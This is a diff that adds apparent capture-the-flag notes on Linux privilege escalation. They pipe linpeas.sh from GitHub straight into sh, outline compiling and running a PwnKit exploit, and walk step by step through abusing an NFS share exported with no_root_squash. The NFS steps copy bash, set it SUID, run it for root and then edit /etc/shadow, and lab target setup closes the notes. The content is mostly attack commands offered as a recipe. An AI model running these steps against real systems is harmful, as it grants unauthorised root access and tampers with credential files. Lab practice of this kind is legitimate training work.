@@ -28,4 +28,131 @@
 
     cat filename
 
-    
+****************
+OR
+****************
+
+# run linpeas (to check for local vulnerabilities)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+Check PwnKit exploit findings
+
+Google Pwnkit exploit
+
+Download / Copy the link
+
+move to tmp
+
+cd /tmp
+# git clone exploit
+cd exploitfolder
+make
+whoami
+# run exploit
+./cve
+#whoami
+# root
+
+*************************
+OR MISCONFIGURED NFS
+*************************
+sudo nmap -sV ip
+
+#port 2049 is open 
+#install nfs common package
+sudo apt-get install nfs-common
+
+showmount -e <ip>
+
+#can see the directory
+
+# or use command 
+sudo nmap -sV --script=nfs-showmount ip
+
+# mount this hsare in attacking machine
+
+# make directory in tmpp folder
+
+mkdir tmp/nfs
+
+# mount
+sudo mount -t nfs ip:/home /tmp/nfs
+
+cd /tmp/nfs
+
+sudo cp /bin/bash .
+
+sudo chmod +s bash
+
+ls -la
+
+#to see free space on all drives
+sudo df -h
+
+# get access to target machine using ssh
+
+ssh uname@ip
+
+whoami
+
+id
+
+cd /home
+
+./bash -p
+
+id
+
+whoami
+
+Got Root access
+
+Get the Flag
+
+#if required
+
+nano /etc/shadow
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Target Configuration (not required)
+--------------------------------
+
+sudo apt install nfs-kernal-server
+
+sudo nano /etc/exports
+
+  #add
+  /home *(rw,no_root_squash)
+
+sudo /etc/init.d/nfs-kernal-server restart
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
